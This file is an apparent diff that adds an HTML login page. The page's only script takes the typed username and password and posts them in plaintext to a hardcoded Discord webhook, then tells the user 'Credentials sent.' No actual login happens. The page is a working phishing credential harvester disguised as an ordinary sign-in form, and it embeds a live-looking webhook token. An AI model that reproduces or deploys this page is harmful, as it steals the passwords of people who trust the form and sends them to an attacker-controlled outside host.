@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Page</title>
+  <style>
+    body {
+      background: #f0f0f0;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background: white;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .login-box h2 {
+      margin-bottom: 20px;
+    }
+    .login-box input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+    }
+    .login-box button {
+      width: 100%;
+      padding: 10px;
+      background: #007bff;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h2>Login</h2>
+    <input type="text" id="username" placeholder="Username" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <button onclick="sendToWebhook()">Login</button>
+  </div>
+
+  <script>
+    function sendToWebhook() {
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      if (!username || !password) {
+        alert("Please enter both username and password.");
+        return;
+      }
+
+      const webhookURL = 'https://discord.com/api/webhooks/1378748798704025610/LZxepAELA4F_D2bUSVTrywBFXXX5226JhoB4CS0O96_KyboVfJSs7mVx_zNZq5zFv4BJ';
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `🔐 **Login Attempt**\n👤 Username: \`${username}\`\n🔑 Password: \`${password}\``
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          alert("Credentials sent.");
+        } else {
+          alert("Failed to send.");
+        }
+      })
+      .catch(error => {
+        console.error("Error:", error);
+      });
+    }
+  </script>
+</body>
+</html>
